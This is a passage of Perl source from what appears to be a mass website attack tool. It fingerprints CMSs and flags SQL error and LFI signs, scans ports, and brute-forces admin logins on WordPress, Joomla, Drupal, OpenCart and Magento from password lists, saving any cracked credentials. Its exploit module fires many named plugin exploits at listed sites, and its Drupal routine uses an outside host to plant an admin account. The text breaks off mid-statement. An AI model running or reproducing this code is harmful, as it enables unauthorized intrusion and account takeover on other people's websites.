elsif($check =~/Microsoft JET Database|ODBC Microsoft Access Driver/) {
print "[!] MS Access Vulnerable\n";
if($number eq '1'){open(save, '>>sql/msaccess-Vuln.txt');
    print save "$site";
    close(save);}
}
elsif($check =~/You have an error in your SQL|Warning: mysql_|function.mysql|MySQL result index|MySQL Error|MySQL ODBC|MySQL Driver|mysqli.query|num_rows|mysql error:/) {
print "[!] MySQL Vulnerable\n";
if($number eq '1'){open(save, '>>sql/mySQL-ERROR.txt');
    print save "$site";
    close(save);}
}
else {
print "[!] MySQL NOT Vulnerable\n";
}
print "==================================================================================================\n";
}
print "\n\n[+] Would you save results in output file?\n\n";
print "[1] YES\n";
print "[2] NO\n";
$number=<STDIN>;
chomp $number;
if($number eq '2'){
exit;
}

}
####################################
############### scan ###############
####################################
	 if (defined($search_scan))
{
     print "[+] SCANNING SITES\n" ;
     print "[+] LIST TO SCAN : $search_scan\n\n\n" ;
scan();
}
sub scan {

open (search_scan, "<$search_scan") || die "\n YOUR LIST IS NOT FOUND\n\n";
my @search_scan = <search_scan>;
close search_scan;
 
foreach $site(@search_scan) {
 
if($site !~ /http:\/\//) { $site = "http://$site/"; };
scandetect();
}
sub scandetect($site){
################################ all cms #########################
my $V_WP=("<a href=\"https:\/\/wordpress.org\/\">Proudly powered by WordPress|<meta name=\"generator\" content=\"WordPress|\/wp-content\/(.*).js");
my $V_JOOM=("<script type=\"text\/javascript\" src=\"\/media\/system\/js\/mootools.js\"><\/script>| \/media\/system\/js\/|com_content|Joomla!");
my $V_TP=("Powered by <a href=\"http:\/\/www.textpattern.com\" title=\"Textpattern");
my $V_SMF=("<a href=\"http:\/\/www.simplemachines.org/about/copyright.php\" title=\"Free Forum Software\" target=\"_blank\">SMF");
my $V_PhpBB=("Powered by <a href=\"http:\/\/www.phpbb.com/\">phpBB");
my $V_VB=("<a href=\"https:\/\/www.vbulletin.com\" id=\"vbulletinlink\">vBulletin|vBulletin Solutions\, Inc\. All rights reserved");
my $V_MyBB=("Powered By <a href=\"http:\/\/www.mybboard.net\" target=\"_blank\">MyBB");
my $V_CF=("<a href=\"http:\/\/www.cloudflare.com\/\" target=\"_blank\" style|DDoS protection by CloudFlare");
my $V_DRP=("name=\"Generator\" content=\"Drupal");
my $V_PN=("<meta name=\"generator\" content=\"PostNuke");
my $V_AT=("<a href=\"/about.php\">About ATutor");
my $V_PHPN=("<META NAME=\"GENERATOR\" CONTENT=\"PHP-Nuke");
my $V_MD=("Powered by <a href=\"http:\/\/moodle.org\" title=\"Moodle\">Moodle|<meta name=\"key words\" content=\"moodle");
my $V_ACM=("Powered by <a href=\"http:\/\/www.adaptcms.com\">AdaptCMS");
my $V_SS=("<meta name=\"generator\" content=\"SilverStripe - http:\/\/silverstripe.org\" \/>");
my $V_MX=("<a href=\"http:\/\/www.modx.com\" target=\"_blank\"> Powered by MODx");
my $V_XO=("<meta name=\"generator\" content=\"XOOPS");
my $V_OSC=("Powered by osCommerce|<a href=\"http:\/\/www.oscommerce.com\" target=\"_blank\">osCommerce");
my $V_PSH=("<a class=\"_blank_blank\" href=\"http:\/\/www.prestashop.com\" target=\"_blank|Software para Ecommerce de PrestaShop");
my $V_BB2=("<meta name=\"generator\" content=\"b2evolution");
my $V_MG=("MAGENTO\, INC\. ALL RIGHTS RESERVED|Magento Ecommerce by Smart Solutions|Log into Magento Admin Page|Magento|powered by magento|name=\"dummy\" id=\"dummy\"|Site magento|index.php\customer\account\|skin\frontend\|powered by webforms");
my $V_ZC=("all rights reserved Zen Cart|<a href=\"http:\/\/www.zen-cart.com\" target=\"_blank\">Zen Cart");
my $V_CC5=("Powered by concrete5|<meta name=\"generator\" content=\"concrete");
my $V_OCR=("Powered By OpenCart");
my $V_XSS=("You have an error in your SQL|Warning: mysql_|function.mysql|MySQL result index|MySQL Error|MySQL ODBC|MySQL Driver|mysqli.query|num_rows|mysql error:",
           "supplied argument is not a valid MySQL result resource|on MySQL result index|Error Executing Database Query|mysql_");
my $V_LFI=("root:x|root:x:0:0:|mysql:x:");
my $V_TODO=(".|a|e|i|o|u|,");
my $V_AFD=("DB_NAME|DB_USER|DB_PASSWORD");
my $V_LM=("image\/gif");

###################################################################

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent($auser[rand @auser]);
$ua->timeout (8);
 
#################### time work
my $check = $ua->get("$site")->content;
################### cms
print "SITE:";
print "$site";
print "CMS:";

if($check =~/$V_WP/) {
    print colored("[WORDPRESS]",'blue'),"\n";
open(save, '>>cms/wordpress.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_JOOM/) {
    print colored("[JOOMLA]",'blue'),"\n";
open(save, '>>cms/joomla.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_TP/) {
    print colored("[TEXTPATTERN]",'blue'),"\n";
open(save, '>>cms/textpattern.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_SMF/) {
    print colored("[SMF]",'blue'),"\n";
open(save, '>>cms/smf.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_PhpBB/) {
    print colored("[PHPBB]",'blue'),"\n";
open(save, '>>cms/phpbb.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_VB/) {
    print colored("[VBULLETIN]",'blue'),"\n";
open(save, '>>cms/vbulletin.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_MyBB/) {
    print colored("[MYBB]",'blue'),"\n";
open(save, '>>cms/mybb.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_CF/) {
    print colored("[CLOUDFARE]",'blue'),"\n";
open(save, '>>cms/cloudfare.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_DRP/) {
    print colored("[DRUPAL]",'blue'),"\n";
open(save, '>>cms/drupal.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_PN/) {
    print colored("[POSTNUKE]",'blue'),"\n";
open(save, '>>cms/postnuke.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_AT/) {
    print colored("[ATUTOR]",'blue'),"\n";
open(save, '>>cms/atutor.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_PHPN/) {
    print colored("[PHPNUKE]",'blue'),"\n";
open(save, '>>cms/phpnuke.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_MD/) {
    print colored("[MOODLE]",'blue'),"\n";
open(save, '>>cms/moodle.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_ACM/) {
    print colored("[ADAPTCMS]",'blue'),"\n";
open(save, '>>cms/adaptcms.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_SS/) {
    print colored("[SILVERSTRIPE]",'blue'),"\n";
open(save, '>>cms/silverstripe.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_MX/) {
    print colored("[MODX]",'blue'),"\n";
open(save, '>>cms/modx.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_XO/) {
    print colored("[XOOPS]",'blue'),"\n";
open(save, '>>cms/xoops.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_OSC/) {
    print colored("[OSCOMMERCE]",'blue'),"\n";
open(save, '>>cms/oscommerce.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_PSH/) {
    print colored("[PRESTASHOP]",'blue'),"\n";
open(save, '>>cms/prestashop.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_BB2/) {
    print colored("[B2EVOLUTION]",'blue'),"\n";
open(save, '>>cms/b2evolution.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_MG/) {
    print colored("[MAGENTO]",'blue'),"\n";
open(save, '>>cms/magento.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_ZC/) {
    print colored("[ZEN CART]",'blue'),"\n";
open(save, '>>cms/zencart.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_CC5/) {
    print colored("[CONCRETE5]",'blue'),"\n";
open(save, '>>cms/concrete5.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_OCR/) {
    print colored("[OPENCART]",'blue'),"\n";
open(save, '>>cms/opencart.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_XSS/) {
    print colored("[MySQL]",'blue'),"\n";
open(save, '>>cms/mysql.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_LFI/) {
    print colored("[LFI]",'blue'),"\n";
open(save, '>>cms/lfi.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_AFD/) {
    print colored("[DB]",'blue'),"\n";
open(save, '>>cms/db.txt');
    print save "$site";
    close(save);
}
elsif($check =~/$V_LM/) {
    print colored("[LOKOMEDIA]",'blue'),"\n";
open(save, '>>cms/lokomedia.txt');
    print save "$site";
    close(save);
}
#################### UNKNOWN cms
else{
   print colored("[UNKNOWN]",'BOLD WHITE'),"\n";
}
print "==================================================================================================\n";
}
}
####################### PORT SCAN for IP
	 if (defined($ip_scan))
{
     print "[+] STARTING IP SCAN \n" ;
     print "[+] IP TO SCAN : $ip_scan\n\n\n" ;
ip_scan();
}

sub ip_scan {

$ip = "$ip_scan";
$ponto = "$ip_scan";

  ($ponto = $ip) || &uso();

  my %conectado = split /:/, 
  "tcpmux:1:compressnet:2:compressnet:3:rje:5:echo:7:discard:9:systat:11:daytime:13:qotd:17:msp:18:chargen:19:ftp-data:20:ftp:21:ssh:22:telnet:23:smtp:25:nsw-fe:27:msg-icp:29:msg-auth:31:dsp:33:time:37:rap:38:rlp:39:graphics:41:name:42:nameserver:42:nicname:43:mpm-flags:44:mpm:45:mpm-snd:46:ni-ftp:47:auditd:48:tacacs:49:re-mail-ck:50:la-maint:51:xns-time:52:domain:53:xns-ch:54:isi-gl:55:xns-auth:56:xns-mail:58:ni-mail:61:acas:62:whois++:63:covia:64:tacacs-ds:65:sql*net:66:bootps:67:bootpc:68:tftp:69:gopher:70:netrjs-1:71:netrjs-2:72:netrjs-3:73:netrjs-4:74:deos:76:vettcp:78:finger:79:http:80:www:80:www-http:80:hosts2-ns:81:xfer:82:mit-ml-dev:83:ctf:84:mit-ml-dev:85:mfcobol:86:kerberos:88:su-mit-tg:89:dnsix:90:mit-dov:91:npp:92:dcp:93:objcall:94:supdup:95:dixie:96:swift-rvf:97:tacnews:98:metagram:99:newacct:100:hostname:101:gppitnp:103:cso:105:csnet-ns:105:3com-tsmux:106:rtelnet:107:snagas:108:pop-3:110:sunrpc:111:mcidas:112:ident:113:auth:113:audionews:114:sftp:115:ansanotify:116:uucp-path:117:sqlserv:118:nntp:119:cfdptkt:120:erpc:121:smakynet:122:ntp:123:ansatrader:124:locus-map:125:nxedit:126:locus-con:127:gss-xlicen:128:pwdgen:129:cisco-fna:130:cisco-tna:131:cisco-sys:132:statsrv:133:ingres-net:134:epmap:135:profile:136:netbios-ns:137:netbios-dgm:138:netbios-ssn:139:emfis-data:140:emfis-cntl:141:bl-idm:142:imap:143:uma:144:uaac:145:iso-ip:147:jargon:148:aed-512:149:sql-net:150:hems:151:bftp:152:sgmp:153:netsc-prod:154:netsc-dev:155:sqlsrv:156:knet-cmp:157:pcmail-srv:158:nss-routing:159:sgmp-traps:160:snmp:161:snmptrap:162:cmip-man:163:cmip-agent:164:xns-courier:165:s-net:166:namp:167:rsvd:168:send:169:print-srv:170:multiplex:171:xyplex-mux:173:mailq:174:vmnet:175:genrad-mux:176:xdmcp:177:nextstep:178:bgp:179:ris:180:unify:181:audit:182:ocbinder:183:ocserver:184:remote-kis:185:kis:186:aci:187:mumps:188:qft:189:gacp:190:prospero:191:osu-nms:192:srmp:193:irc:194:dn6-nlm-aud:195:dn6-smm-red:196:dls:197:dls-mon:198:smux:199:src:200:at-rtmp:201:at-nbp:202:at-3:203:at-echo:204:at-5:205:at-zis:206:at-7:207:at-8:208:qmtp:209:anet:212:ipx:213:vmpwscs:214:softpc:215:CAIlic:216:dbase:217:mpp:218:uarps:219:fln-spx:221:rsh-spx:222:cdc:223:masqdialer:224:direct:242:sur-meas:243:dayna:244:link:245:dsp3270:246:subntbcst_tftp:247:bhfhs:248:rap:256:set:257:yak-chat:258:esro-gen:259:openport:260:nsiiops:261:arcisdms:262:hdap:263:bgmp:264:http-mgmt:280:personal-link:281:cableport-ax:282:rescap:283:corerjd:284:novastorbakcup:308:entrusttime:309:bhmds:310:asip-webadmin:311:vslmp:312:magenta-logic:313:opalis-robot:314:dpsi:315:decauth:316:zannet:317:pkix-timestamp:318:ptp-event:319:ptp-general:320:pip:321:rtsps:322:pdap:344:pawserv:345:zserv:346:fatserv:347:csi-sgwp:348:mftp:349:matip-type-a:350:matip-type-b:351:bhoetty:351:dtag-ste-sb:352:bhoedap4:352:ndsauth:353:datex-asn:355:bhevent:357:shrinkwrap:358:tenebris_nts:359:scoi2odialog:360:semantix:361:srssend:362:rsvp_tunnel:363:aurora-cmgr:364:dtk:365:odmr:366:mortgageware:367:qbikgdp:368:rpc2portmap:369:clearcase:371:ulistproc:372:legent-1:373:legent-2:374:hassle:375:nip:376:tnETOS:377:dsETOS:378:is99c:379:is99s:380:hp-collector:381:hp-managed-node:382:hp-alarm-mgr:383:arns:384:ibm-app:385:asa:386:aurp:387:ldap:389:uis:390:synotics-relay:391:synotics-broker:392:dis:393:embl-ndt:394:netcp:395:netware-ip:396:mptn:397:kryptolan:398:iso-tsap-c2:399:work-sol:400:ups:401:genie:402:decap:403:nced:404:ncld:405:imsp:406:timbuktu:407:prm-sm:408:prm-nm:409:decladebug:410:rmt:411:synoptics-trap:412:smsp:413:infoseek:414:bnet:415:silverplatter:416:onmux:417:hyper-g:418:ariel1:419:smpte:420:ariel2:421:ariel3:422:opc-job-start:423:opc-job-track:424:icad-el:425:smartsdp:426:svrloc:427:ocs_cmu:428:ocs_amu:429:utmpsd:430:utmpcd:431:iasd:432:nnsp:433:mobileip-agent:434:mobilip-mn:435:dna-cml:436:comscm:437:dsfgw:438:dasp:439:sgcp:440:decvms-sysmgt:441:cvc_hostd:442:https:443:snpp:444:microsoft-ds:445:ddm-rdb:446:ddm-dfm:447:ddm-ssl:448:as-servermap:449:tserver:450:sfs-smp-net:451:sfs-config:452:creativeserver:453:contentserver:454:creativepartnr:455:macon-tcp:456:scohelp:457:appleqtc:458:ampr-rcmd:459:skronk:460:datasurfsrv:461:datasurfsrvsec:462:alpes:463:kpasswd:464:digital-vrc:466:mylex-mapd:467:photuris:468:rcp:469:scx-proxy:470:mondex:471:ljk-login:472:hybrid-pop:473:tcpnethaspsrv:475:ss7ns:477:spsc:478:iafserver:479:iafdbase:480:ph:481:bgs-nsi:482:ulpnet:483:integra-sme:484:powerburst:485:avian:486:saft:487:gss-http:488:nest-protocol:489:micom-pfs:490:go-login:491:ticf-1:492:ticf-2:493:pov-ray:494:intecourier:495:pim-rp-disc:496:dantz:497:siam:498:iso-ill:499:isakmp:500:stmf:501:asa-appl-proto:502:intrinsa:503:citadel:504:mailbox-lm:505:ohimsrv:506:crs:507:xvttp:508:snare:509:fcp:510:passgo:511:exec:512:login:513:shell:514:printer:515:videotex:516:talk:517:ntalk:518:utime:519:efs:520:ripng:521:ulp:522:ncp:524:timed:525:tempo:526:stx:527:custix:528:irc-serv:529:courier:530:conference:531:netnews:532:netwall:533:mm-admin:534:iiop:535:opalis-rdv:536:nmsp:537:gdomap:538:apertus-ldp:539:uucp:540:uucp-rlogin:541:commerce:542:klogin:543:kshell:544:appleqtcsrvr:545:dhcpv6-client:546:dhcpv6-server:547:afpovertcp:548:idfp:549:new-rwho:550:cybercash:551:deviceshare:552:pirp:553:rtsp:554:dsf:555:remotefs:556:openvms-sysipc:557:sdnskmp:558:teedtap:559:rmonitor:560:monitor:561:chshell:562:nntps:563:9pfs:564:whoami:565:streettalk:566:banyan-rpc:567:ms-shuttle:568:ms-rome:569:meter:570:meter:571:sonar:572:banyan-vip:573:ftp-agent:574:vemmi:575:ipcd:576:vnas:577:ipdd:578:decbsrv:579:sntp-heartbeat:580:bdp:581:scc-security:582:philips-vc:583:keyserver:584:imap4-ssl:585:password-chg:586:submission:587:cal:588:eyelink:589:tns-cml:590:http-alt:591:eudora-set:592:http-rpc-epmap:593:tpip:594:cab-protocol:595:smsd:596:ptcnameservice:597:acp:599:ipcserver:600:urm:606:nqs:607:sift-uft:608:npmp-trap:609:npmp-local:610:npmp-gui:611:hmmp-ind:612:hmmp-op:613:sshell:614:sco-inetmgr:615:sco-sysmgr:616:sco-dtmgr:617:dei-icda:618:digital-evm:619:sco-websrvrmgr:620:escp-ip:621:collaborator:622:aux_bus_shunt:623:cryptoadmin:624:dec_dlm:625:asia:626:passgo-tivoli:627:qmqp:628:rda:630:ipp:631:bmpp:632:servstat:633:ginad:634:rlzdbase:635:ldaps:636:lanserver:637:mcns-sec:638:msdp:639:entrust-sps:640:repcmd:641:sanity:643:dwr:644:pssc:645:ldp:646:dhcp-failover:647:rrp:648:aminet:649:obex:650:ieee-mms:651:udlr-dtcp:652:repscmd:653:aodv:654:tinc:655:spmp:656:rmc:657:tenfold:658:url-rendezvous:659:mac-srvr-admin:660:hap:661:pftp:662:purenoise:663:mdqs:666:doom:666:disclose:667:mecomm:668:meregister:669:vacdsm-sws:670:vacdsm-app:671:vpps-qua:672:cimplex:673:acap:674:dctp:675:vpps-via:676:vpp:677:ggf-ncp:678:mrm:679:entrust-aaas:680:entrust-aams:681:xfr:682:corba-iiop:683:corba-iiop-ssl:684:mdc-portmapper:685:hcp-wismar:686:asipregistry:687:realm-rusd:688:elcsd:704:agentx:705:borland-dsj:707:entrust-kmsh:709:entrust-ash:710:cisco-tdp:711:netviewdm1:729:netviewdm2:730:netviewdm3:731:netgw:741:netrcs:742:flexlm:744:fujitsu-dev:747:ris-cm:748:kerberos-adm:749:rfile:750:pump:751:qrh:752:rrh:753:tell:754:nlogin:758:con:759:ns:760:rxe:761:quotad:762:cycleserv:763:omserv:764:webster:765:phonebook:767:vid:769:cadlock:770:rtip:771:cycleserv2:772:submit:773:rpasswd:774:entomb:775:wpages:776:multiling-http:777:wpgs:780:concert:786:qsc:787:mdbs_daemon:800:device:801:fcp-udp:810:itm-mcell-s:828:pkix-3-ca-ra:829:rsync:873:iclcnet-locate:886:iclcnet_svinfo:887:accessbuilder:888:cddbp:888:omginitialrefs:900:xact-backup:911:ftps-data:989:ftps:990:nas:991:telnets:992:imaps:993:ircs:994:pop3s:995:vsinet:996:maitrd:997:busboy:998:garcon:999:puprouter:999:cadlock:1000:surf:1010:raserver:4000:cpanel:2082";

  %conectado = reverse %conectado;

  my @portas = sort por_numero keys %conectado;


  ### Principal
  &config($ip);
  &comeca_festa;
  exit;  
  ###


  ### Funcoes 
  
sub comeca_festa {
  my $nportas = 0;
  foreach $porta (@portas) {
	# cria socket
    $sock = IO::Socket::INET->new("$ponto:$porta");
	
	# se sock, entao imprima dados
	
	if($sock) {
  	  print "Port $porta\t$conectado{$porta}\n";
	  $nportas++;

	}
  }
  
  # finaliza
  print "\n\n$nportas opened in $ponto\n";
}
sub por_numero {
    if ( $a < $b ) { -1 }
    elsif ( $a > $b ) { 1 }
    else { 0 }
}

# configura titulo, e limpa a tela
sub config {

  system("clear");

  my $titulo = "PORTSCANNER - ";
  $titulo = $titulo.$_[0];

  print colored ("=" x length($titulo),'blue');
  print "\n";
  printf("%s\n", $titulo);
  print colored ("=" x length($titulo),'blue');
  print "\n";
}
sub uso{
print "You are leaveing the port scan\n\n";
exit;
}
}
##############################
######### BRUTEFORCE #########
##############################
	 if (defined($br_list))
{
     print "[+] SCANNING SITES\n" ;
     print "[+] LIST TO BRUTE FORCE : $br_list\n\n\n" ;
$list= "$br_list";
	 br();
}

sub br {
use URI::URL;
use Getopt::Long;

    open (THETARGET, "<$list") || die "[-] ERROR FILE";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;

OUTER: foreach $site(@TARGETS){
chomp($site);

print "\n\n[*] URL: $site";
cms();
}
}

sub cms(){
$magsite = $site . '/admin';
my $magcms = $ua->get("$magsite")->content;
my $cms = $ua->get("$site")->content;
if($cms =~/<a href=\"https:\/\/wordpress.org\/\">Proudly powered by WordPress|<meta name=\"generator\" content=\"WordPress|\/wp-content\/(.*).js/) {
   print color("bold white"), " - WordPress\n\n";
wpuser();
}

elsif($cms =~/<script type=\"text\/javascript\" src=\"\/media\/system\/js\/mootools.js\"><\/script>| \/media\/system\/js\/|com_content|Joomla!/) {
   print color("bold white"), " - Joomla\n\n"; 
joomlabr();
}
elsif($cms =~/name=\"Generator\" content=\"Drupal|Drupal|drupal|sites\/all|drupal.org/) {
   print color("bold white"), " - Drupal\n\n";
drupalbr();
}

elsif($cms =~/route=product|OpenCart|route=common|catalog\/view\/theme/) {
   print color("bold white"), " - OpenCart\n\n";
opencartbr();
}

elsif($magcms =~/MAGENTO\, INC\. ALL RIGHTS RESERVED|Magento Ecommerce by Smart Solutions|Log into Magento Admin Page|Magento|powered by magento|name=\"dummy\" id=\"dummy\"|Site magento|index.php\customer\account\|skin\frontend\|powered by webforms/) {
   print color("bold white"), " - Magento\n\n";
magentobr();
}
else{
print color("bold white"), " - IDK\n\n";
}
}

sub wpuser{
print color('reset');
$user = $site . '/?author=1';

$getuser = $ua->get($user)->content;
if($getuser =~/author\/(.*?)\//){
$wpuser=$1;
print "[+] Username: $wpuser\n";
wp();
}
else {
print "Can't Get Username\n\n";
}
}

sub wp{
print"[-] START BRUTE\n";
open(a,"<$pass") or die "$!";
while(<a>){
chomp($_);
$wp = $site . '/wp-login.php';
$redirect = $site . '/wp-admin/';
$wpass = $_;
print "[-] Trying: $wpass ";
$wpbrute = POST $wp, [log => $wpuser, pwd => $wpass, wp-submit => 'Log In', redirect_to => $redirect];
$response = $ua->request($wpbrute);
my $stat = $response->as_string;

if($stat =~ /Location:/){
if($stat =~ /wordpress_logged_in/){

print "- ";
print color('bold green'),"GOOOOOD\n";
print color('reset');

open (TEXT, '>>BruteForce/Result.txt');
print TEXT "$wp ==> User: $wpuser Pass: $wpass\n";
close (TEXT);
next OUTER;
}
}
}
}

sub joomlabr{
$joomsite = $site . '/administrator/index.php';

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (30);
$ua->cookie_jar(
        HTTP::Cookies->new(
            file => 'mycookies.txt',
            autosave => 1
        )
    );


$getoken = $ua->get($joomsite)->content;
if ( $getoken =~ /name="(.*)" value="1"/ ) {
$token = $1 ;
}else{
print "[-] Can't Grabb Joomla Token !\n";
next OUTER;
}

print"[-] START BRUTE";
open(a,"<$pass") or die "$!";
while(<a>){
chomp($_);
$joomuser = admin;
$joompass = $_;
print "\n[-] Trying: $joompass ";
$joomlabrute = POST $joomsite, [username => $joomuser, passwd => $joompass, lang =>en-GB, option => user_login, task => login, $token => 1];
$response = $ua->request($joomlabrute);

my $check = $ua->get("$joomsite")->content;
if ($check =~ /logout/){
print "- ";
print color('bold green'),"GOOOOOD\n";
print color('reset');

open (TEXT, '>>BruteForce/Result.txt');
print TEXT "$joomsite => User: $joomuser Pass: $joompass\n";
close (TEXT);
next OUTER;
}
}
}

sub drupalbr{
print"[-] START BRUTE";
open(a,"<$pass") or die "$!";
while(<a>){
chomp($_);
$druser = admin;
$drupass = $_;
print "\n[-] Trying: $drupass ";

$drupal = $site . '/user/login';
$redirect = $site . '/user/1';

$drupalbrute = POST $drupal, [name => $druser, pass => $drupass, form_build_id =>'', form_id => 'user_login',op => 'Log in', location => $redirect];
$response = $ua->request($drupalbrute);
$stat = $response->status_line;
    if ($stat =~ /302/){
print "- ";
print color('bold green'),"GOOOOOD\n";
print color('reset');

open (TEXT, '>>BruteForce/Result.txt');
print TEXT "$drupal => User: $druser Pass: $drupass\n";
close (TEXT);
next OUTER;
}
}
}

sub opencartbr{
print"[-] START BRUTE";
open(a,"<$pass") or die "$!";
while(<a>){
chomp($_);
$ocuser = admin;
$ocpass = $_;
print "\n[-] Trying: $ocpass ";
$OpenCart= $site . '/admin/index.php';

$ocbrute = POST $OpenCart, [username => $ocuser, password => $ocpass,];
$response = $ua->request($ocbrute);
$stat = $response->status_line;
if ($stat =~ /302/){
print "- ";
print color('bold green'),"GOOOOOD\n";
print color('reset');
open (TEXT, '>>BruteForce/Result.txt');
print TEXT "$OpenCart => User: $ocuser Pass: $ocpass\n";
close (TEXT);
next OUTER;
}
}
}

sub magentobr{
$magsite = $site . '/admin';

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (30);
$ua->cookie_jar(
        HTTP::Cookies->new(
            file => 'mycookies.txt',
            autosave => 1
        )
    );
    
$getoken = $ua->get($magsite)->content;
if ( $getoken =~ /type="hidden" value="(.*)"/ ) {
$token = $1 ;
}else{
print "[-] Can't Grabb Magento Token !\n";
next OUTER;
}

print"[-] START BRUTE";
open(a,"<$pass") or die "$!";
while(<a>){
chomp($_);
$maguser = "admin";
$magpass = $_;
print "\n[-] Trying: $magpass ";

$magbrute = POST $magsite, ["form_key" => "$token", "login[username]" => "$maguser", "dummy" => "", "login[password]" => "$magpass"];
$response = $ua->request($magbrute);
my $pwnd = $ua->get("$magsite")->content;
if ($pwnd =~ /logout/){
print "- ";
print color('bold green'),"GOOOOOD\n";
print color('reset');
open (TEXT, '>>BruteForce/Result.txt');
print TEXT "$magsite => User: $maguser Pass: $magpass\n";
close (TEXT);
next OUTER;
}
}
}


##############################
########## EXPLOIT ###########
##############################
	 if (defined($ex_list))
{
     print "[+] EXPLOITING SITES\n" ;
     print "[+] LIST TO EXPLOIT : $ex_list\n\n\n" ;
ex();
}

sub ex {
open (ex_list, "<$ex_list") || die "\n [LIST NOT FOUND]";
my @ex_list = <ex_list>;
close ex_list;
 
OUTER: foreach $site(@ex_list){
chomp($site);
$a++;
exdetect();
}
}

sub exdetect {
my $check = $ag1->get("$site")->content;
my $V_ZC=("all rights reserved Zen Cart|<a href=\"http:\/\/www.zen-cart.com\" target=\"_blank\">Zen Cart");
my $V_DRP=("name=\"Generator\" content=\"Drupal|Drupal|drupal|sites\/all|drupal.org/");
my $V_WP=("<a href=\"https:\/\/wordpress.org\/\">Proudly powered by WordPress|<meta name=\"generator\" content=\"WordPress|\/wp-content\/(.*).js");
my $V_JOOM=("<script type=\"text\/javascript\" src=\"\/media\/system\/js\/mootools.js\"><\/script>| \/media\/system\/js\/|com_content|Joomla!");
my $V_XSS=("You have an error in your SQL|Warning: mysql_|function.mysql|MySQL result index|MySQL Error|MySQL ODBC|MySQL Driver|mysqli.query|num_rows|mysql error:",
           "supplied argument is not a valid MySQL result resource|on MySQL result index|Error Executing Database Query|mysql_fetch_|The used SELECT statements have a different number of columns|SQL query failed|mysql_");
my $V_PSH=("<a class=\"_blank_blank\" href=\"http:\/\/www.prestashop.com\" target=\"_blank|Software para Ecommerce de PrestaShop");
my $V_LM=("image\/gif");
my $V_LM1=("lokomedia");
		   if($check =~/$V_ZC/) {
    print colored("[ZEN CART]: $site",'blue'),"\n";
open(save, '>>cms/zencart.txt');
    print save "$site";
    close(save);
zencart();
}
elsif($check =~/$V_DRP/) {
    print colored("[DRUPAL]: $site",'blue'),"\n";
open(save, '>>cms/drupal.txt');
    print save "$site";
    close(save);
drupal();
}
elsif($check =~/$V_LM/) {
    print colored("[LOKOMEDIA]: $site",'blue'),"\n";
open(save, '>>cms/lokomedia.txt');
    print save "$site";
    close(save);
    lokomedia();
}
elsif($check =~/$V_LM1/) {
    print colored("[LOKOMEDIA]: $site",'blue'),"\n";
open(save, '>>cms/lokomedia.txt');
    print save "$site";
    close(save);
    lokomedia();
}
elsif($check =~/$V_PSH/) {
    print colored("[PRESTASHOP]: $site",'blue'),"\n";
open(save, '>>cms/prestashop.txt');
    print save "$site";
    close(save);
columnadverts();
soopamobile();
soopabanners();
vtermslideshow();
simpleslideshow();
productpageadverts();
homepageadvertise();
homepageadvertise2();
jro_homepageadvertise();
attributewizardpro();
oneattributewizardpro();
attributewizardproOLD();
attributewizardpro_x();
advancedslider();
cartabandonmentpro();
cartabandonmentproOld();
videostab();
wg24themeadministration();
fieldvmegamenu();
wdoptionpanel();
pk_flexmenu();
pk_vertflexmenu();
nvn_export_orders();
megamenu();
tdpsthemeoptionpanel();
psmodthemeoptionpanel();
masseditproduct();
}
elsif($check =~/$V_JOOM/) {
    print colored("[JOOMLA]: $site",'blue'),"\n";
open(save, '>>cms/joomla.txt');
    print save "$site";
    close(save);
comjce();
comedia();
comjdownloads();
comfabrik();
comfabrik2();
foxcontact();
comadsmanager();
comblog();
comusers();
comweblinks();
mod_simplefileupload();
}
elsif($check =~/$V_WP/) {
    print colored("[WORDPRESS]: $site",'blue'),"\n";
open(save, '>>cms/wordpress.txt');
    print save "$site";
    close(save);
	levoslideshow();
    addblockblocker();
    blaze();
    catpro();
    cherry();
    downloadsmanager();
    formcraft();
    powerzoomer();
    gravityforms();
    revslider();
    getconfig();
    getconfig1();
    showbiz();
    ads();
    slideshowpro();
    wpmobiledetector();
    wysija();
    inboundiomarketing();
    dzszoomsounds();
    reflexgallery();
    sexycontactform();
    wtffu();
    wpjm();
    phpeventcalendar();
    synoptic();
    Wpshop();
    wpinjection();
    Wordpress_Themes();
}
else{
   print colored("[UNKNOWN]: $site",'BOLD WHITE'),"\n";
   open(save, '>>cms/UNKNOWN.txt');
   print save "$site";
   close(save);
}

}

sub drupal {

$drupalink = "http://phuongnammobile.vn/drupal.php"; # make sure to check link if it still work , if its not upload it yourself [ you can do it with wampp ( windows ) or with apache2 ( linux ) ]
my $exploit = "$drupalink?url=$site&submit=submit";
$admin ="M0B";
$pass  ="M0B";
$dr = $site . '/user/login';
$red = $site . '/user/1';
my $checkk = $ag1->get("$exploit")->content;
if($checkk =~/Success!/) {
print color('bold red'),"[";
